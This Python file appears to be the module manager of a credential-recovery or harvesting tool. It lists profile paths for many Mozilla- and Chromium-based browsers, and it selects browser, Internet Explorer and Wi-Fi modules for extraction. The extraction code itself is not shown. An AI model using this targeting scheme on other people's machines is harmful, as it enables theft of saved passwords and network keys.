from modules.chromium.chromium import Chromium
from modules.firefox.mozilla import Mozilla
from modules.windows.ie import IE
from modules.windows.wifi import Wifi

mozilla_browsers = [
	(u'firefox', u'{APPDATA}\\Mozilla\\Firefox'),
	(u'blackHawk', u'{APPDATA}\\NETGATE Technologies\\BlackHawk'),
	(u'cyberfox', u'{APPDATA}\\8pecxstudios\\Cyberfox'),
	(u'comodo IceDragon', u'{APPDATA}\\Comodo\\IceDragon'),
	(u'k-Meleon', u'{APPDATA}\\K-Meleon'),
	(u'icecat', u'{APPDATA}\\Mozilla\\icecat'),
]

chromium_browsers = [
	(u'7Star', u'{LOCALAPPDATA}\\7Star\\7Star\\User Data'),
	(u'amigo', u'{LOCALAPPDATA}\\Amigo\\User Data'),
	(u'brave', u'{LOCALAPPDATA}\\BraveSoftware\\Brave-Browser\\User Data'),
	(u'centbrowser', u'{LOCALAPPDATA}\\CentBrowser\\User Data'),
	(u'chedot', u'{LOCALAPPDATA}\\Chedot\\User Data'),
	(u'chrome canary', u'{LOCALAPPDATA}\\Google\\Chrome SxS\\User Data'),
	(u'chromium', u'{LOCALAPPDATA}\\Chromium\\User Data'),
	(u'chromium edge', u'{LOCALAPPDATA}\\Microsoft\\Edge\\User Data'),
	(u'coccoc', u'{LOCALAPPDATA}\\CocCoc\\Browser\\User Data'),
	(u'comodo dragon', u'{LOCALAPPDATA}\\Comodo\\Dragon\\User Data'),  # Comodo IceDragon is Firefox-based
	(u'elements browser', u'{LOCALAPPDATA}\\Elements Browser\\User Data'),
	(u'epic privacy browser', u'{LOCALAPPDATA}\\Epic Privacy Browser\\User Data'),
	(u'google chrome', u'{LOCALAPPDATA}\\Google\\Chrome\\User Data'),
	(u'kometa', u'{LOCALAPPDATA}\\Kometa\\User Data'),
	(u'opera', u'{APPDATA}\\Opera Software\\Opera Stable'),
	(u'orbitum', u'{LOCALAPPDATA}\\Orbitum\\User Data'),
	(u'sputnik', u'{LOCALAPPDATA}\\Sputnik\\Sputnik\\User Data'),
	(u'torch', u'{LOCALAPPDATA}\\Torch\\User Data'),
	(u'uran', u'{LOCALAPPDATA}\\uCozMedia\\Uran\\User Data'),
	(u'vivaldi', u'{LOCALAPPDATA}\\Vivaldi\\User Data'),
	(u'yandexBrowser', u'{LOCALAPPDATA}\\Yandex\\YandexBrowser\\User Data')
]


class ModuleManager:

	def __init__(self):
		self.targets = {
			'mozilla': [],
			'chromium': [],
			'ie': False,
			'wifi': False
		}

	def select_target_modules(self, modules):
		if isinstance(modules, list):
			modules = [module.lower() for module in modules]
		else:
			modules = [modules.lower()]

		if 'all' in modules:
			self.targets.get('mozilla').extend([module for module in mozilla_browsers])
			self.targets.get('chromium').extend([module for module in chromium_browsers])
			self.targets['ie'] = True
			self.targets['wifi'] = True
		else:
			if 'ie' in modules:
				self.targets['ie'] = True

			if 'wifi' in modules:
				self.targets['wifi'] = True

			for module in modules:
				self.iterate_modules(module.lower(), self.targets, mozilla_browsers, 'mozilla')
				self.iterate_modules(module.lower(), self.targets, chromium_browsers, 'chromium')

	def iterate_modules(self, module, targets, modules_array, key):
		if (module not in targets.get(key)) and (module in [item[0] for item in modules_array]):
			for item in modules_array:
				if module == item[0].lower():
					targets.get(key).append(item)
					break

	def prepare_modules_drivers(self):
		driver = []
		for key in self.targets.keys():
			if self.targets.get(key):
				match key:
					case 'mozilla':
						driver.extend([Mozilla(browser_name=name, path=path) for name, path in self.targets.get(key)])
					case 'chromium':
						driver.extend([Chromium(browser_name=name, paths=paths) for name, paths in self.targets.get(key)])
					case 'ie':
						driver.extend([IE()])
					case 'wifi':
						driver.extend([Wifi()])
		return driver